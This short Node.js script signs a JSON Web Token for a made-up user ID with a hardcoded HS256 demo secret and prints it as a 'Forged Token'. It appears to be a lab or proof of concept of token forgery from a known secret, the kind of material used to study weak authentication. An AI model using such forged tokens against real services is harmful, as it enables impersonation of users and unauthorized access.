const jwt = require("jsonwebtoken");

const secret = "my-super-secret-key-for-demo-12345678901234567890";

const fakeUserId = "2";

iat = Math.floor(Date.now() / 1000)
exp = iat + 3600

const payload = {
  sub: fakeUserId,
  role: "USER"
};

const token = jwt.sign(payload, secret, { algorithm: "HS256", expiresIn: "1h" });

console.log("Forged Token:");
console.log(token);
